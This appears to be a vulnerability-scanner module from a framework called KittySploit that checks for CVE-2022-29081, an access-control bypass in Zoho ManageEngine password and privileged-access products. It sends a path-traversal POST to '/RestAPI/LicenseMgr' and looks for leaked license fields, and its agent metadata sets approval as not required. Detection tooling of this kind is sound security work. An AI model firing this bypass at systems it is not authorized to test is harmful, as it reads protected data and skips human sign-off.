#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zoho ManageEngine Access Manager Plus before 4302, Password Manager Pro before 12007, and PAM360 before 5401 a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zoho ManageEngine - Access Control Bypass Detection',
        'description': 'Zoho ManageEngine Access Manager Plus before 4302, Password Manager Pro before 12007, and PAM360 before 5401 are vulnerable to access-control bypass on a few Rest API URLs (for SSOutAction. SSLAction. LicenseMgr. GetProductDetails. GetDashboard. FetchEvents. and Synchronize) via the ../RestAPI substring.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'zoho', 'manageengine', 'auth-bypass', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.tenable.com/security/research/tra-2022-14',
            'https://www.manageengine.com/privileged-session-management/advisory/cve-2022-29081.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-29081',
        ],
        'cve': 'CVE-2022-29081',
    }

    def run(self):
        path = '/x/..//RestAPI/LicenseMgr'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='operation=getLicenseDetails\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"BUILD_NO"', '"LICENSE_TO"', '"VERSION"', '"PRODUCT_NAME"',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Zoho ManageEngine - Access Control Bypass detected', path=path)
            return True
        return False

